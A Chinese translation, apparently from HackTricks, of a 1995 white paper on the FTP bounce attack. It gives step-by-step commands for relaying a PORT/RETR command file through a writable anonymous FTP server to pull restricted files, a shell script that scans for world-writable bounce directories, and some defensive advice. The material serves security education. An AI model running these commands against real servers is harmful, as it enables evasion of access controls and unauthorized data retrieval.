<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>


# 概述

如果您可以访问一个跳板FTP服务器，您可以让它请求其他FTP服务器（您知道一些凭证）的文件，并将该文件下载到您自己的服务器。

## 要求

FTP中间服务器的有效凭证
受害者FTP服务器的有效凭证
两个服务器都接受PORT命令（跳板FTP攻击）
您可以在FTP中间服务器的某个目录内写入
出于某种原因，中间服务器将在受害者FTP服务器内拥有比您更多的访问权限（这是您要利用的）

## 步骤

1. 连接到您自己的FTP服务器，并使连接处于被动模式（pasv命令），以便它在受害者服务将发送文件的目录中监听
2. 制作FTP中间服务器将发送给受害者服务器的文件（利用）。这个文件将是一个纯文本，包含对受害者服务器进行认证、更改目录和下载文件到您自己服务器的必要命令。
3. 连接到FTP中间服务器并上传前面的文件
4. 使FTP中间服务器与受害者服务器建立连接并发送利用文件
5. 在您自己的FTP服务器上捕获文件
6. 从FTP中间服务器删除利用文件



本帖子中的所有信息均摘自：[http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# FTP跳板攻击

这讨论了"FTP服务器跳板攻击"的许多可能用途之一。使用的机制可能众所周知，但到目前为止，对详细说明或修复它的兴趣似乎很低。这个特定的例子展示了另一种方式，即大多数电子执行的"出口限制"完全无用且易于绕过。选择这个例子是为了让读者注意到标准FTP协议的一些真正设计不当的方面。

也感谢几个月前在imag.fr的Alain Knaff进行了简短但有趣的讨论，这些问题让我对它们有了更深入的思考。

## 动机

您是foreign.fr上的用户，IP地址为F.F.F.F，想从美国的crypto.com检索加密源代码。crypto.com的FTP服务器设置为允许您的连接，但因为您的源IP地址是非美国站点的\[至少他们的FTP服务器从DNS中可以确定是这样\]，所以拒绝访问加密源。无论如何，您无法直接从crypto.com的服务器检索您想要的内容。

然而，crypto.com会允许ufred.edu下载加密源，因为ufred.edu也在美国。您碰巧知道ufred.edu上的/incoming是一个世界可写的目录，任何匿名用户都可以放入文件并从中读取。Crypto.com的IP地址是C.C.C.C。

## 攻击

这假设您有一个支持被动模式的FTP服务器。打开一个到您自己机器实际IP地址的FTP连接\[不是localhost\]并登录。更改到一个您有写权限的方便目录，然后执行：
```text
pasv
stor foobar
```
```markdown
注意从PASV命令返回的地址和端口，F,F,F,F,X,X。这个FTP会话现在将挂起，所以将其放到后台，或者切换到另一个窗口，以便继续进行下面的操作。

构建一个包含FTP服务器命令的文件。我们将这个文件称为“`instrs`”。它看起来像这样：
```
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
```
打开一个到ufred.edu的FTP连接，匿名登录，并切换到/incoming目录。现在在这个FTP会话中输入以下命令，它会传输你的"`instrs`"文件的副本，然后指示ufred.edu的FTP服务器使用你的文件作为命令连接到crypto.com的FTP服务器：
```
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` 现在应该在您的机器上通过您的第一个 FTP 连接显示为 "`foobar`"。如果与 ufred.edu 的连接没有因为一个常见的服务器错误而自己断开，请通过删除 "`instrs`" 并退出来清理。否则，您将不得不重新连接以完成操作。

## 讨论

这有几个变种。您的 PASV 监听连接可以在任何您有文件写入权限的机器上打开——您自己的机器，与 ufred.edu 的另一个连接，或者完全无关的地方。实际上，它甚至不必是 FTP 服务器——任何能在已知 TCP 端口上监听并将原始数据读入文件的工具都可以。被动模式 FTP 数据连接只是一种方便的方式。

命令文件末尾的额外空值是为了填满 ufred -> crypto 连接两端的 TCP 窗口，并确保命令连接保持打开状态足够长的时间，以执行整个会话。否则，大多数 FTP 服务器在控制连接过早关闭时倾向于中止所有传输和命令处理。数据的大小足以填满接收和传输窗口，这在某些操作系统上是相当大的\[大约 30K\]。如果您知道两端的操作系统以及它们默认 TCP 窗口大小的总和，您可以减少这个大小。它被分成每行 250 个字符，以避免超出目标服务器的命令缓冲区——这可能是学术性的，因为您已经告诉服务器退出了。

如果 crypto.com 不允许您在 foreign.fr 的 *任何* FTP 客户端连接，并且您需要查看文件的位置，您可以始终在命令文件中放入 "`list -aR`" 并通过 ufred 获取整个树的目录列表。

您可能必须以 ASCII 模式而不是二进制模式将命令文件检索到目标的 FTP 服务器。一些 FTP 服务器可以处理原始换行符，但其他服务器可能需要命令行以 CRLF 对结束。当将文件检索到除 FTP 服务器之外的守护进程时，也要记住这一点。

## 其他可能性

尽管这样的第三方连接只是单向的，但它们可以用于各种事情。类似的方法可以用来发布几乎无法追踪的邮件和新闻，不断攻击各个站点的服务器，填满磁盘，尝试跳过防火墙，同时又令人讨厌且难以追踪。稍加思考就会意识到许多其他可怕的可能性。

这样启动的连接来自源端口 20，一些站点允许它们通过防火墙，以处理 "ftp-data" 问题。在某些情况下，这可能是次优的源路由攻击，而且在源路由在数据包过滤器上失败的情况下可能会成功。这一切都是由 FTP 协议规范的编写方式使然，允许控制连接来自任何地方，数据连接可以去任何地方。

## 防御

网络上总会有一些带有老旧 FTP 服务器和可写目录的站点，允许此类流量，所以说 "修复所有 FTP 服务器" 是错误的答案。但是您可以保护自己的服务器，既不成为第三方跳板点，也不被其他服务器用作跳板点。

首先明显的做法是只允许 FTP 服务器与控制连接起源的同一主机进行数据连接。这当然不能防止上述攻击，因为 PASV 监听器可以同样容易地位于 ufred.edu 上，从而满足该要求，但它确实防止了 *您的* 站点成为潜在的跳板点。这也破坏了 "代理 FTP" 的概念，但隐藏在这段话中的是一个非常小的小提琴。

下一个明显的做法是禁止来自保留端口的 FTP 控制连接，或者至少是端口 20。这可以防止上述情况。

这两件事，加上通常关于阻止源路由数据包和其他欺骗途径的建议，都是防止此类黑客攻击所必需的。并且考虑一下您是否真的需要一个开放的 "incoming" 目录。

只允许被动模式客户端数据连接是另一种可能性，但仍然有太多不支持被动模式的 FTP 客户端在使用。

## "松散的共识和运行代码"

这方面的一些现有工作可以在 avian.org 这里找到\[并且已经有几个月了，我可能会补充\]，位于 "[fixkits 归档](ftp://ftp.avian.org:/src/fixkits/)"。提出了对 wu-ftpd-2.4 的几项修改，包括防止和记录使用伪造 PORT 命令的尝试的代码。还包括来自其他地方的最新安全修复，以及支持 s/key 和各种编译时选项，以增强特定应用的安全性。

Stan Barber 在 academ.com 正在努力将这些和其他几项修复合并到一个真正更新的 wu-ftpd 版本中。还有其他几个不同的努力正在进行。没有地方声称这项工作已经完成，但这是我已经考虑了一段时间的事情——一个网络范围内的 wu-ftpd-2.5 发布，来自网络各地的贡献。wu-ftpd 服务器已经非常流行，但迫切需要另一次安全升级。将所有改进汇集到一个协调的地方，并且看起来这将会发生，这将是很好的。当然，这些都无法帮助那些坚持运行供应商提供的服务器的人。

在 FTP 服务器修复中没有具体实现对客户端连接源端口的合理性检查，而是在 Wietse 的 tcp-wrappers 包的修改中实现，因为这个问题更普遍。添加了一个简单的 PORT 选项，它在 tcpd 阶段拒绝来自可配置源端口范围的连接，在调用守护进程之前。

这里的 [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) 指出了一些内容。在获取其他东西之前，请先阅读这个路线图。

## 注释

在命令文件末尾添加空值是使这项工作针对各种守护进程的关键。仅发送所需数据通常会失败，因为立即关闭信号使守护进程退出。

如果 WUSTL 没有完全放弃整个 wu-ftpd 项目，他们对进一步的工作保持非常沉默。Bryan O'Connor 看起来现在有许多其他项目要参与...

这是一个简单的脚本，用于在基于 unix 的匿名 FTP 服务器上查找全球可写和 ftp 拥有的目录和文件。您会惊讶地发现，在运行这样的东西后不久，有多少这样的可写 "跳板点" 出现。您稍后将不得不检查您是否可以从这些地方 PUT 和 GET 文件；一些服务器保护上传的文件不被读取。许多服务器不这样做，然后想知道为什么它们是本周前十大 warez 站点之一...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
```markdown
我想这可以称为一份白皮书。它可以在avian.org的[/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack)获取，同时也在各个相关地方发布。_H* 950712

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
```
